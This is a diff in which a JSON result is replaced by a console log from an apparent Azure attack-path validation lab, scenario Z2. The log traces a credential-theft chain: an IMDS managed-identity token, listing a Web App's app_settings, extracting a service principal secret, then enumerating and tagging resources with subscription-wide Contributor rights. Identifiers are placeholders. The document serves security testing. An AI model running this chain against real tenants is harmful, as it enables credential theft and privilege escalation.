@@ -1,22 +1,45 @@
-{
-  "status": "success",
-  "scenario": "Z2 - Service Principal credential theft via App Service app_settings",
-  "attck_id": "T1552.001",
-  "aws_analogue": "P7 (Lambda env-var theft)",
-  "initial_identity": "VM System-Assigned MI (Website Contributor on one Web App)",
-  "pivoted_to": "SP <ELEVATED_SP_CLIENT_ID> (Contributor at subscription scope)",
-  "evidence": {
-    "resources_enumerated": 8,
-    "resource_types": [
-      "Microsoft.Compute/disks",
-      "Microsoft.Compute/virtualMachines",
-      "Microsoft.Network/networkInterfaces",
-      "Microsoft.Network/networkSecurityGroups",
-      "Microsoft.Network/publicIPAddresses",
-      "Microsoft.Network/virtualNetworks",
-      "Microsoft.Web/serverFarms",
-      "Microsoft.Web/sites"
-    ],
-    "tag_written": "pathtriage-z2=owned"
-  }
-}
+[*] target VM:                <VM_PUBLIC_IP>
+[*] foothold:                 VM System-Assigned MI with Website Contributor on one Web App
+[*] target Web App:           pathtriage-z2-app-<rand>
+[*] acting from the VM itself (no external attacker host required)
+
+[*] Step 1: query IMDS for Managed Identity token (ARM-scoped)
+[+] MI ARM token acquired
+    token length:             2055 chars
+    resource:                 https://management.azure.com/
+
+[*] Step 2: POST .../sites/<app>/config/appsettings/list as MI
+[+] retrieved 5 app_settings key(s):
+    ['AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID', 'ENV', 'WEBSITES_PORT']
+
+[*] Step 3: parse plaintext SP credentials from app_settings
+[+] tenant_id (elevated SP):  <TENANT_ID>
+    client_id (elevated SP):  <ELEVATED_SP_CLIENT_ID>
+    client_secret length:     40 chars
+
+[*] Step 4: OAuth2 client_credentials flow to AAD as the stolen SP
+[+] SP ARM token acquired
+    token length:             1883 chars
+    scope:                    https://management.azure.com/.default
+
+[*] Step 5a: enumerate resources in RG as SP (Contributor proof, read)
+[+] enumerated 8 resource(s) at RG scope
+    resource_types:
+      - Microsoft.Compute/disks
+      - Microsoft.Compute/virtualMachines
+      - Microsoft.Network/networkInterfaces
+      - Microsoft.Network/networkSecurityGroups
+      - Microsoft.Network/publicIPAddresses
+      - Microsoft.Network/virtualNetworks
+      - Microsoft.Web/serverFarms
+      - Microsoft.Web/sites
+
+[*] Step 5b: PATCH tag on RG as SP (Contributor proof, write)
+[+] tag write succeeded
+    tag:                      pathtriage-z2=owned
+    api-version:              2021-04-01  (operation=Merge required)
+
+[+] Path Z2 verified: VM MI (Website Contributor on 1 app) ->
+                      app_settings credential leak ->
+                      SP OAuth2 client_credentials ->
+                      subscription-scope Contributor
